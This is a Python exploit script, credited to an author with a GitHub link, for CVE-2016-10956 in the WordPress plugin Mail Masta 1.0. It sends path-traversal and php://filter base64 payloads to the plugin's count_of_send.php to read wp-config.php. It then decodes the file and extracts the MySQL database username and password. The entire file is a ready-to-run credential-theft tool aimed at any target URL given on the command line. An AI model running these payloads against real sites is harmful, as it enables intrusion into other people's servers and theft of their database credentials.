# Mail-Masta 1.0 automated script for exploiting the CVE-2016-10956 vulnerability to extract credentials from wp-config.php.
# Author: Hackhoven
# GitHub Repository: https://github.com/Hakchoven/wp-mail-masta-exploit


import requests
import sys
import base64
import re
from colorama import init, Fore, Style

init(autoreset=True)

def exploit_lfi(target_url):

    """
    Exploit the Local File Inclusion (LFI) vulnerability in WordPress Plugin Mail Masta 1.0.
    This function attempts to read the wp-config.php file and extract MySQL credentials.
    :param target_url: The base URL of the WordPress site (e.g., http://example.com/wordpress)
    """

    payload = f"{target_url}/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=../../../../../wp-config.php"
    try:
        response = requests.get(payload)
        if response.status_code == 200 and "DB_USER" in response.text:
            print(Fore.GREEN + "[+] Successfully read wp-config.php")
            print(Fore.CYAN + response.text)
        else:
            print(Fore.YELLOW + "[!] Direct read failed or incomplete, trying base64 encoding method")
            payload = f"{target_url}/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php"
            response = requests.get(payload)
            if response.status_code == 200:
                try:
                    decoded_content = base64.b64decode(response.text).decode('utf-8')
                    print(Fore.GREEN + "[+] Successfully read and decoded wp-config.php")
                    print(Fore.CYAN + decoded_content)

                    db_user = re.search(r"define\(\s*'DB_USER'\s*,\s*'([^']+)'\s*\);", decoded_content)
                    db_password = re.search(r"define\(\s*'DB_PASSWORD'\s*,\s*'([^']+)'\s*\);", decoded_content)

                    if db_user and db_password:
                        print(Fore.GREEN + f"[+] MySQL Database Username: {db_user.group(1)}")
                        print(Fore.GREEN + f"[+] MySQL Database Password: {db_password.group(1)}")
                    else:
                        print(Fore.RED + "[-] Failed to extract MySQL credentials")
                except base64.binascii.Error as e:
                    print(Fore.RED + f"[-] Failed to decode base64 content: {e}")
            else:
                print(Fore.RED + f"[-] HTTP Status Code: {response.status_code}")
                print(Fore.RED + "[-] Response Text:", response.text)
    except Exception as e:
        print(Fore.RED + f"[-] An error occurred: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(Fore.RED + f"Usage: {sys.argv[0]} <target_url>")
        print(Fore.RED + f"Example: {sys.argv[0]} http://example.com")
        sys.exit(1)
    
    target_url = sys.argv[1]

    exploit_lfi(target_url)
